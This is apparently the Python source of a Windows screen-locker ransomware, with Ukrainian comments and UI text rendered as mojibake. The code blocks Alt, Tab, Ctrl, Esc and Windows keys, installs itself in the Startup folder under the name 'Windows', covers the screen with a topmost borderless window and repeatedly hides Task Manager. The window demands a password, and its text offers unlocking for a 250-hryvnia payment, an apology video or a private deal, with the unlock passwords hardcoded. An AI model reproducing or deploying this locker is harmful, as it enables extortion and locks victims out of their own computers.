import customtkinter as ctk
import os
import time
import keyboard
import win32gui
import win32con
import win32com.client
import sys

# –ü–∞—Ä–æ–ª—ñ
PASSWORD = "14707"
BACKUP_PASSWORD = "unlockmepls"

# –ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –≤–∏–¥–∞–ª–µ–Ω–∞: —Å–∫—Ä—ñ–º–µ—Ä —Ç–∞ –≥—É—Å—å –ø—Ä–∏–±—Ä–∞–Ω—ñ

# –¢–µ–º–∏ —Ç–∞ –∫–æ–ª—å–æ—Ä–∏
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

# –ü–æ–∫—Ä–∞—â–µ–Ω–∞ –∫–æ–ª—å–æ—Ä–æ–≤–∞ –ø–∞–ª—ñ—Ç—Ä–∞
COLORS = {
    "bg_primary": "#0a0c10",
    "bg_secondary": "#141b22", 
    "bg_tertiary": "#1f2937",
    "bg_card": "#1e293b",
    "accent": "#3b82f6",
    "accent_hover": "#2563eb",
    "accent_dark": "#1d4ed8",
    "text_primary": "#f8fafc",
    "text_secondary": "#94a3b8",
    "text_muted": "#64748b",
    "error": "#ef4444",
    "error_bg": "#7f1d1d",
    "warning": "#f59e0b",
    "success": "#10b981",
    "border": "#374151",
    "shadow": "#000000"
}

# –ë–ª–æ–∫—É—î–º–æ –∫–æ–º–±—ñ–Ω–∞—Ü—ñ—ó –∫–ª–∞–≤—ñ—à
keyboard.block_key("alt")
keyboard.block_key("tab")
keyboard.block_key("esc")
keyboard.block_key("windows")
keyboard.block_key("ctrl")

# –•–æ–≤–∞—î–º–æ –≤—ñ–∫–Ω–æ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞ –∑–∞–¥–∞—á
def disable_task_manager():
    def enum_handler(hwnd, lParam):
        if win32gui.IsWindowVisible(hwnd):
            title = win32gui.GetWindowText(hwnd)
            if "Task Manager" in title or "–î–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á" in title:
                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
    win32gui.EnumWindows(enum_handler, None)

# –î–æ–¥–∞—î–º–æ —Ñ–∞–π–ª –¥–æ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫—É
def add_to_startup(file_path, name):
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    shortcut_path = os.path.join(startup_folder, f"{name}.lnk")

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = file_path
    shortcut.WorkingDirectory = os.path.dirname(file_path)
    shortcut.IconLocation = file_path
    shortcut.Save()

# –î–æ–¥–∞—î–º–æ —Å–µ–±–µ –≤ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫
this_path = os.path.abspath(sys.argv[0])
add_to_startup(this_path, "Windows")

# –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫ –≥—É—Å—è –≤–∏–¥–∞–ª–µ–Ω–æ

# –í—ñ–∫–Ω–æ –∑ –≥—Ä–∞–¥—ñ—î–Ω—Ç–Ω–∏–º —Ñ–æ–Ω–æ–º
root = ctk.CTk()
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
root.geometry(f"{screen_width}x{screen_height}+0+0")
root.configure(fg_color=COLORS["bg_primary"])
root.attributes("-topmost", True)
root.overrideredirect(True)

# –û—Å–Ω–æ–≤–Ω–∏–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –∑ —Ç—ñ–Ω–Ω—é
main_frame = ctk.CTkFrame(
    master=root, 
    fg_color=COLORS["bg_primary"],
    corner_radius=0
)
main_frame.pack(fill="both", expand=True)

# –¶–µ–Ω—Ç—Ä–∞–ª—å–Ω–∞ –ø–∞–Ω–µ–ª—å –∑ –ø–æ–∫—Ä–∞—â–µ–Ω–∏–º –¥–∏–∑–∞–π–Ω–æ–º
content_frame = ctk.CTkFrame(
    master=main_frame, 
    fg_color=COLORS["bg_card"],
    corner_radius=24,
    border_width=1,
    border_color=COLORS["border"]
)
content_frame.pack(expand=True, fill="both", padx=50, pady=50)

# –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä –¥–ª—è –∑–∞–≥–æ–ª–æ–≤–∫–∞
header_frame = ctk.CTkFrame(
    content_frame,
    fg_color="transparent",
    corner_radius=0
)
header_frame.pack(fill="x", pady=(50, 40))

# –Ü–∫–æ–Ω–∫–∞ –±–ª–æ–∫—É–≤–∞–Ω–Ω—è –∑ –µ—Ñ–µ–∫—Ç–æ–º
lock_icon = ctk.CTkLabel(
    header_frame, 
    text="üîê", 
    font=ctk.CTkFont(size=72),
    text_color=COLORS["error"]
)
lock_icon.pack(pady=(0, 20))

# –ó–∞–≥–æ–ª–æ–≤–æ–∫ –∑ –≥—Ä–∞–¥—ñ—î–Ω—Ç–Ω–∏–º –µ—Ñ–µ–∫—Ç–æ–º
title_label = ctk.CTkLabel(
    header_frame, 
    text="–°–ò–°–¢–ï–ú–ê –ó–ê–ë–õ–û–ö–û–í–ê–ù–ê", 
    font=ctk.CTkFont(size=36, weight="bold"), 
    text_color=COLORS["text_primary"]
)
title_label.pack(pady=(0, 8))

# –ü—ñ–¥–∑–∞–≥–æ–ª–æ–≤–æ–∫
subtitle = ctk.CTkLabel(
    header_frame, 
    text="–ù–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø –∑–∞–±–æ—Ä–æ–Ω–µ–Ω–æ", 
    font=ctk.CTkFont(size=16), 
    text_color=COLORS["text_muted"]
)
subtitle.pack(pady=(0, 10))

# –°—Ç–∞—Ç—É—Å –ª—ñ–Ω—ñ—è
status_line = ctk.CTkFrame(
    header_frame,
    height=2,
    fg_color=COLORS["error"],
    corner_radius=1
)
status_line.pack(fill="x", padx=100, pady=(10, 0))

# –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä –¥–ª—è —Ñ–æ—Ä–º–∏
form_frame = ctk.CTkFrame(
    content_frame,
    fg_color="transparent",
    corner_radius=0
)
form_frame.pack(fill="x", pady=(20, 10))

# –õ–µ–π–±–ª –¥–ª—è –ø–æ–ª—è –≤–≤–æ–¥—É
input_label = ctk.CTkLabel(
    form_frame,
    text="–ü–∞—Ä–æ–ª—å –¥–ª—è —Ä–æ–∑–±–ª–æ–∫—É–≤–∞–Ω–Ω—è:",
    font=ctk.CTkFont(size=14, weight="bold"),
    text_color=COLORS["text_secondary"]
)
input_label.pack(pady=(0, 8))

# –ü–æ–ª–µ –¥–ª—è –ø–∞—Ä–æ–ª—è –∑ –ø–æ–∫—Ä–∞—â–µ–Ω–∏–º –¥–∏–∑–∞–π–Ω–æ–º
entry = ctk.CTkEntry(
    form_frame, 
    placeholder_text="–í–≤–µ–¥—ñ—Ç—å –ø–∞—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø—É...", 
    show="‚óè", 
    font=ctk.CTkFont(size=18), 
    width=400,
    height=50,
    corner_radius=12,
    border_width=2,
    border_color=COLORS["border"],
    fg_color=COLORS["bg_tertiary"],
    text_color=COLORS["text_primary"],
    placeholder_text_color=COLORS["text_muted"]
)
entry.pack(pady=(0, 10))

# –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫–∏
error_label = ctk.CTkLabel(
    form_frame, 
    text="", 
    text_color=COLORS["error"], 
    font=ctk.CTkFont(size=14, weight="bold")
)
error_label.pack(pady=(5, 0))

# –Ü—Å—Ç–æ—Ä—ñ—è —Å–ø—Ä–æ–±
attempts_label = ctk.CTkLabel(
    form_frame, 
    text="", 
    text_color=COLORS["text_muted"], 
    font=ctk.CTkFont(size=12)
)
attempts_label.pack(pady=(5, 0))

# –ö–æ–º–ø–∞–∫—Ç–Ω–∏–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –¥–ª—è —É–º–æ–≤
conditions_frame = ctk.CTkFrame(
    content_frame,
    corner_radius=12,
    fg_color=COLORS["bg_tertiary"],
    border_width=1,
    border_color=COLORS["border"]
)
conditions_frame.pack(fill="x", pady=(10, 20), padx=40)

# –°–∫–æ—Ä–æ—á–µ–Ω—ñ —É–º–æ–≤–∏ —Ä–æ–∑–±–ª–æ–∫—É–≤–∞–Ω–Ω—è
conditions_text = (
    "‚ö†Ô∏è –í–∞—Ä—ñ–∞–Ω—Ç–∏ —Ä–æ–∑–±–ª–æ–∫—É–≤–∞–Ω–Ω—è: –û–ø–ª–∞—Ç–∞ 250‚Ç¥ ‚Ä¢ –í—ñ–¥–µ–æ –∑ –≤–∏–±–∞—á–µ–Ω–Ω—è–º–∏ ‚Ä¢ –î–æ–º–æ–≤–ª–µ–Ω–æ—Å—Ç—ñ –≤ –õ–°"
)

conditions_label = ctk.CTkLabel(
    conditions_frame, 
    text=conditions_text, 
    font=ctk.CTkFont(size=11), 
    text_color=COLORS["text_muted"], 
    justify="center"
)
conditions_label.pack(pady=15, padx=20)

# –ó–∞–≥–∞–¥–∫–∞ –≤–∏–¥–∞–ª–µ–Ω–∞

# –°–∫—Ä—ñ–º–µ—Ä –≤–∏–¥–∞–ª–µ–Ω–æ

# –ê–Ω—ñ–º–∞—Ü—ñ—è –ø–æ–º–∏–ª–∫–∏ (–∑–∞–º—ñ—Å—Ç—å —Ç—Ä—è—Å–∫–∏)
def show_error_animation():
    # –ü–ª–∞–≤–Ω–∞ –∞–Ω—ñ–º–∞—Ü—ñ—è –∑–º—ñ–Ω–∏ –∫–æ–ª—å–æ—Ä—É –¥–ª—è –ø–æ–∫–∞–∑—É –ø–æ–º–∏–ª–∫–∏
    original_color = error_label.cget("text_color")
    
    # –ê–Ω—ñ–º–∞—Ü—ñ—è –º–æ—Ä–≥–∞–Ω–Ω—è
    for i in range(4):
        error_label.configure(text_color=COLORS["error"])
        entry.configure(border_color=COLORS["error"])
        root.update()
        time.sleep(0.15)
        error_label.configure(text_color="#ff8888")
        entry.configure(border_color="#ff8888")
        root.update()
        time.sleep(0.15)
    
    # –ü–æ–≤–µ—Ä—Ç–∞—î–º–æ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ –∫–æ–ª—å–æ—Ä–∏
    error_label.configure(text_color=original_color)
    entry.configure(border_color=COLORS["border"])
    entry.delete(0, 'end')  # –û—á–∏—â–∞—î–º–æ –ø–æ–ª–µ –≤–≤–æ–¥—É

# –†–æ–∑–±–ª–æ–∫—É–≤–∞–Ω–Ω—è
def unlock():
    user_input = entry.get()
    attempts_label.configure(text="–°–ø—Ä–æ–±–∞: " + user_input)  # –í–∏–≤–æ–¥–∏–º–æ, —â–æ –≤–≤—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á

    if user_input == PASSWORD:
        root.destroy()
    elif user_input == BACKUP_PASSWORD:
        root.destroy()
    else:
        error_label.configure(text="–ù–µ–≤—ñ—Ä–Ω–∏–π –ø–∞—Ä–æ–ª—å!")
        show_error_animation()

# –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä –¥–ª—è –∫–Ω–æ–ø–∫–∏
button_frame = ctk.CTkFrame(
    content_frame,
    fg_color="transparent",
    corner_radius=0
)
button_frame.pack(fill="x", pady=(20, 30))

# –ö–Ω–æ–ø–∫–∞ —Ä–æ–∑–±–ª–æ–∫—É–≤–∞–Ω–Ω—è –∑ –ø–æ–∫—Ä–∞—â–µ–Ω–∏–º –¥–∏–∑–∞–π–Ω–æ–º
btn = ctk.CTkButton(
    button_frame, 
    text="üîì  –†–û–ó–ë–õ–û–ö–£–í–ê–¢–ò –°–ò–°–¢–ï–ú–£", 
    command=unlock, 
    font=ctk.CTkFont(size=16, weight="bold"), 
    width=400, 
    height=50, 
    corner_radius=12,
    fg_color=COLORS["accent"],
    hover_color=COLORS["accent_hover"],
    text_color=COLORS["text_primary"],
    border_width=1,
    border_color=COLORS["accent_dark"]
)
btn.pack(pady=10)

# –ü—Ä–∏–≤'—è–∑–∫–∞ –∫–ª–∞–≤—ñ—à—ñ Enter –¥–æ –∫–Ω–æ–ø–∫–∏ —Ä–æ–∑–±–ª–æ–∫—É–≤–∞–Ω–Ω—è
def on_enter(event):
    unlock()

entry.bind('<Return>', on_enter)
entry.focus()  # –ê–≤—Ç–æ—Ñ–æ–∫—É—Å –Ω–∞ –ø–æ–ª–µ –≤–≤–æ–¥—É

# –ó–∞–ø—É—Å–∫ –≥—É—Å—è –≤–∏–¥–∞–ª–µ–Ω–æ

# –ë–µ–∑–∫—ñ–Ω–µ—á–Ω–µ –ø—Ä–∏—Ö–æ–≤—É–≤–∞–Ω–Ω—è Task Manager
def loop_hide_taskmgr():
    disable_task_manager()
    root.after(1000, loop_hide_taskmgr)

loop_hide_taskmgr()
root.mainloop()
